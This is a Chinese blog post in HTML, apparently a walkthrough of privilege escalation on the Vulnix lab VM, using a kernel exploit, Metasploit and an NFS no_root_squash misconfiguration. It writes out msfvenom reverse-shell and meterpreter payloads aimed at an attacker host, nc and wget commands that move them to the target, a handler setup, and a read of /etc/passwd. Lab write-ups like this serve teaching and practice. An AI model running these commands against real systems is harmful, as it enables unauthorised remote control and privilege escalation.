<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnix——nfs提权</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">Vulnix——nfs提权</h1>
        <div class="show-content">
          <p><a href="https://www.jianshu.com/p/4487af2fc94b" target="_blank">续上篇</a>：前景提要，通过smtp的信息泄露，用暴力枚举的方式，我们得到了一个ssh登陆普通用户权限的账号和密码。</p><p>根据以往的经验，提权可以通过linux内核的漏洞，然后运行对应的exploit，来进行提权。</p><blockquote>
<p>uname -a    搜索exploit-db，有提权漏洞。<a href="https://www.exploit-db.com/exploits/18411/" target="_blank">https://www.exploit-db.com/exploits/18411/</a></p>
<p>linux 3.2.0-29-generic-pae</p>
</blockquote><blockquote>
<p>gcc           不能用gcc编译exploit</p>
<p>The program 'gcc' can be found in the following packages:</p>
<p> * gcc</p>
<p> * pentium-builder</p>
<p>Ask your administrator to install one of them</p>
</blockquote><p>因为目标靶机没有权限用gcc编译，所以尝试在kali上编译好了发送过来。</p><blockquote>
<p>nc -lvp 666 &lt; shell           shell是编译好的可执行文件，在kali上监听</p>
<p>nc  192.168.1.107 666 &gt; shell   连接攻击机的666端口，将文件保存为shell</p>
<p>chmod +x shell</p>
<p>./shell</p>
<p>-bash: ./shell:<b> cannot execute binary file</b></p>
</blockquote><p> cannot execute binary file：<a href="http://blog.51cto.com/1381479/888198" target="_blank">参考</a></p><p>那么，可能的原因是不是root，权限不过。要么是，版本不同，必须在目标靶机上编译才能运行。</p><h1>尝试反弹一个shell给攻击机</h1><p>攻击机：msfvenom -p linux/x86/shell_reverse_tcp -f elf  lhost=192.168.1.107 lport=1234 &gt; /var/www/shell</p><p>              nc -lvp 666 &lt; /var/www/shell</p><p>靶机：nc 192.168.1.107 666 &gt; exploit</p><p>            chmod +x exploit</p><p>攻击机：msfconsole</p><p>            use exploit/multi/handler</p><p>            set payload linux/x86/shell_reverse_tcp</p><p>            set LHOST 192.168.1.107</p><p>            set LPORT 1234</p><p>            run</p><p>靶机：./exploit</p><p>我说怎么还是user权限，不是meterpreter.....原来生成的攻击载荷搞错了。ORZ</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-7357f98f994f3def.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><h4>重新尝试：</h4><p>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.1.107 LPORT=1234 X &gt; /var/www/door</p><p>省略一些命令。。。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-52f29ec62460154c.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>em..?未知的命令.....所以meterpreter该怎么用。</p><blockquote><p>ps                          列出所有进程</p></blockquote><blockquote><p>migrate 1785          迁移到pid为1785的进程</p></blockquote><p>[*] Migrating to 1785</p><p>[-] Error running command migrate: Rex::RuntimeError Unsupported session x86/linux</p><blockquote><p>getsystem</p></blockquote><p>[-] Unknown command: getsystem.</p><p><a href="http://wooyun.jozxing.cc/static/drops/tips-10146.html" target="_blank">据说</a>：getsystem 大部分都会失败 他只尝试了4个Payload。</p><p>但是，就是失败，也不应该是unknown command？怀疑我用的是假的meterpreter........</p><h4>第二次重新尝试：</h4><p>查看payload需要的参数：</p><p>方法一：msfvenom -p linux/x86/meterpreter/reverse_tcp --payload-options   </p><blockquote>
<p>Basic options:</p>
<p>Name   Current Setting  Required  Description</p>
<p>LPORT  4444                yes       The listen port</p>
<p>RHOST                         no        The target address</p>
</blockquote><p>方法二：use  payload/linux/x86/meterpreter/reverse_tcp</p><p>              show options</p><p>              back</p><hr><p> msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=192.168.1.107 LPORT=1234 X &gt; /var/www/html/xxx</p><p>wget http://192.168.1.107/xxx</p><p>成功获取到了meterpreter。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-c0300f478e71f626.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><blockquote><p>cat /etc/passwd</p></blockquote><p>根据大于500的为用户账号，系统用户有</p><p>user:x:<b>1000</b>:1000:user,,,:/home/user:/bin/bash</p><p>vulnix:x:<b>2008</b>:2008::/home/vulnix:/bin/bash</p><p>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</p><blockquote><p> background</p></blockquote><p>search exploit/linux/local </p><p><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/" target="_blank">meterpreter提权参考</a>。陷入了困境，不知道运行什么样的exp才能获取到最高权限。</p><blockquote><p>search cve:2012-0056       找到一个通过cve编号搜索的方法，但是msf没有对应的exp可用</p></blockquote><hr><p>2018.2.4更新。暂时先放一放meterpreter提权，在上一篇侦察中，获取到靶机开放了nfs服务，Network File System，网络文件系统。用来共享文件。</p><blockquote><p><b>2049/tcp open  nfs_acl</b>    2-3 (RPC #100227)</p></blockquote><p>于是，需要用nfs客户端，<b>apt-get install nfs-common。</b></p><p><b>参考：http://www.phpfans.net/ask/answer1/3810159017.html （root_squath )<br></b></p><p><b>          http://blog.csdn.net/yesuhuangsi/article/details/66475053（ssh使用RSA公钥免密登录远程主机）</b></p><p>          https://www.jianshu.com/p/72e892ab8edf (三步实现SSH无密码登录)<b><br></b></p><p><b>          http://man.linuxde.net/nano （编辑器nano用法）</b></p><p><b>将靶机root_squash，更改为no_root_squash.</b></p><blockquote>
<p>no_root_squash：登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限！这个项目『极不安全』，不建议使用！</p>
<p>root_squash：在登入 NFS 主机使用分享之目录的使用者如果是 root 时，那么这个使用者的权限将被压缩成为匿名使用者，通常他的 UID 与 GID 都会变成 nobody 那个系统账号的身份。</p>
</blockquote><p><a href="https://www.cnblogs.com/dantes91/p/5007992.html" target="_blank">关于nfs共享目录的使用技巧</a>，如果没有用过nfs服务，学习下。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-8be58c6b635481e1.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption">显示远程服务器共享目录</div>
</div><p><b>将远程共享目录挂载到本地</b>，/tmp/nfs 是本地的一个目录。如果没有该目录，可以用“mkdir /tmp/nfs”来新建。<br>mount -t nfs 192.168.1.113:/home/vulnix <b>/tmp/nfs</b></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-178665a456328798.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><b>writup: http://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm<br></b></p><p><b>靶机重启后，有root权限，就可以用gcc编译exp了。</b></p><p><b>cp /root/Desktop/shell.c .<br></b></p><p><b>gcc shell.c -o shell<br></b></p><p><b>chmod +x shell<br></b></p><p><b>./shell<br></b></p><h1><b>总结：</b></h1><p><b>nfs网络文件系统以前根本没用过，，协议不是很熟悉，所以也不知道怎么利用。。</b></p><p><b>no_root_squash提权，就好比ftp协议的匿名用户读写权限吧，我是这么想的。。</b></p><p><b>简单邮件协议smtp配置不当会泄露用户名什么的，再利用ssh爆破真是骚操作。。</b></p>
        </div>
      </div>
    </div>
  </body>
</html>
